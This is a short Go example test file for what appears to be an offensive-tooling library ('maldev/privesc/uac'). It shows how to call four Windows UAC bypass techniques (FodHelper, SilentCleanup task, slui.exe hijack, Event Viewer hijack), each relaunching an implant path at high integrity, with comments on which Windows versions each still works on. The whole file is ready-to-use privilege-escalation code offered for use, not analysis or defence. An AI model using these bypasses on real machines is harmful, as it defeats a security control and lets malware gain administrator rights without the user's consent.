//go:build windows

package uac_test

import (
	"fmt"

	"github.com/oioio-space/maldev/privesc/uac"
)

// FODHelper is the canonical UAC bypass for `MultiSelfHelp` (Win10).
// Re-launches `path` at High IL via the auto-elevated FodHelper.exe.
func ExampleFODHelper() {
	if err := uac.FODHelper(`C:\Users\Public\impl.exe`); err != nil {
		fmt.Println("fodhelper:", err)
	}
}

// SilentCleanup uses the auto-elevated `SilentCleanup` task — useful
// when FodHelper is patched. Same surface, different Auto-Elevated
// binary.
func ExampleSilentCleanup() {
	_ = uac.SilentCleanup(`C:\Users\Public\impl.exe`)
}

// SLUI hijacks the `slui.exe` activation UI. Less reliable on Win11
// but historically the cleanest path on Win10.
func ExampleSLUI() {
	_ = uac.SLUI(`C:\Users\Public\impl.exe`)
}

// EventVwr abuses the auto-elevated Event Viewer (`eventvwr.exe`)
// shell-open hijack. Patched on recent Windows builds; left for
// completeness.
func ExampleEventVwr() {
	_ = uac.EventVwr(`C:\Users\Public\impl.exe`)
}
